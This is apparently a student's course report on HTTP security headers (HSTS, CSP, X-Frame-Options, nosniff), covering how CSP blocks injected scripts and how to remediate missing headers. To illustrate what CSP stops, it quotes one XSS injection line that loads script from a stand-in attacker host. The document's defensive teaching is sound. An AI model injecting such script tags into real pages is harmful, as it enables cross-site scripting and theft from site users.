# Day 16 — HTTP Security Header Analysis Report

## Why these headers matter
| Header | Purpose |
|---|---|
| `Strict-Transport-Security` (HSTS) | Tells the browser to only ever connect over HTTPS for this domain, even if the user types `http://` — closes the window for SSL-stripping downgrade attacks. |
| `Content-Security-Policy` (CSP) | Whitelists which sources (scripts, styles, images, frames) the browser is allowed to load and execute. |
| `X-Frame-Options` | Prevents the page from being loaded inside an `<iframe>` on another site — the core defense against clickjacking. |
| `X-Content-Type-Options: nosniff` | Stops the browser from guessing ("sniffing") a file's MIME type, which attackers can abuse to get a browser to execute an uploaded file as script. |

## How CSP prevents cross-site script loading
Without CSP, any script tag injected into a page (via a stored/reflected
XSS flaw, Day 21) executes with full page privileges — reading
cookies, making requests as the logged-in user, etc. A CSP header like
`Content-Security-Policy: script-src 'self' https://trusted-cdn.com`
tells the browser to **refuse to execute or load any script** that
doesn't come from those explicitly allowed origins — so even if an
attacker successfully injects `<script src="https://evil.com/x.js">`
into the page, the browser will not fetch or run it, and the console
will show a CSP violation instead. This makes CSP a critical
**defense-in-depth** layer that still protects users even when input
sanitization (Day 21) has a gap.

## Findings
Running the script against a local test server flags any of the four
headers that aren't configured — each missing header is a concrete,
actionable finding for the write-up.

## Remediation
Add the missing headers at the web server or reverse-proxy layer
(Nginx/Apache config, or middleware in the app framework) rather than
per-route, so the policy is enforced consistently across the whole
application.

*Deliverable: script output log against a local test server + this breakdown.*
